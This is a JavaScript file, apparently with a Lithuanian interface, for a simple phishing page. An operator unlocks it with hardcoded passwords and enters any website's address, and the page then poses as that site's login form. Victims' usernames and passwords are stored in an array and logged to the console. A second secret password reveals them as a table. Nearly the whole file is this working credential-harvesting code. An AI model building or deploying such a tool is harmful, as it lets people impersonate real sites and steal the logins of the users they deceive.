let users = [];

function login() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    console.log('Login attempt:', username, password);

    if (username && password) {
        document.getElementById('auth-step-1').style.display = 'none';
        document.getElementById('auth-step-2').style.display = 'block';
        console.log('Step 1 completed');
    } else {
        alert('Prašome įvesti naudotojo vardą ir slaptažodį.');
    }
}

function checkSecret() {
    const secretPassword = document.getElementById('secret-password').value;

    console.log('Secret attempt:', secretPassword);

    if (secretPassword === 'Web.Clone') {
        document.getElementById('auth-step-2').style.display = 'none';
        document.getElementById('url-input').style.display = 'block';
        console.log('Step 2 completed');
    } else {
        alert('Neteisingas slaptažodis.');
    }
}

function createLogin() {
    const websiteUrl = document.getElementById('website-url').value;

    console.log('Creating login for:', websiteUrl);

    if (websiteUrl) {
        document.getElementById('url-input').style.display = 'none';
        document.getElementById('app-container').style.display = 'block';
        document.getElementById('app-title').textContent = websiteUrl;
        document.getElementById('app-logo-emoji').textContent = '🌐'; // Pakeisti į norimą emociuką ar paveikslėlį
        document.getElementById('clone-app-title').textContent = websiteUrl;
    } else {
        alert('Prašome įvesti svetainės nuorodą.');
    }
}

function appLogin() {
    const appUsername = document.getElementById('app-username').value;
    const appPassword = document.getElementById('app-password').value;

    console.log('App login attempt:', appUsername, appPassword);

    if (appUsername && appPassword) {
        users.push({ username: appUsername, password: appPassword });
        document.getElementById('app-container').style.display = 'none';
        document.getElementById('turkey').style.display = 'block';
        console.log('App login successful');
    } else {
        alert('Prašome įvesti naudotojo vardą ir slaptažodį.');
    }
}

document.getElementById('turkey').addEventListener('click', function() {
    document.getElementById('turkey').style.display = 'none';
    document.getElementById('turkey-auth').style.display = 'block';
});

function showUsers() {
    const turkeyPassword = document.getElementById('turkey-password').value;

    console.log('Turkey auth attempt:', turkeyPassword);

    if (turkeyPassword === 'Clone.Web') {
        document.getElementById('turkey-auth').style.display = 'none';
        document.getElementById('user-table').style.display = 'block';
        const userList = document.getElementById('user-list');
        userList.innerHTML = '';
        users.forEach(user => {
            const row = document.createElement('tr');
            const usernameCell = document.createElement('td');
            const passwordCell = document.createElement('td');
            usernameCell.textContent = user.username;
            passwordCell.textContent = user.password;
            row.appendChild(usernameCell);
            row.appendChild(passwordCell);
            userList.appendChild(row);
        });
        console.log('Showing users:', users);
    } else {
        alert('Neteisingas slaptažodis.');
    }
}
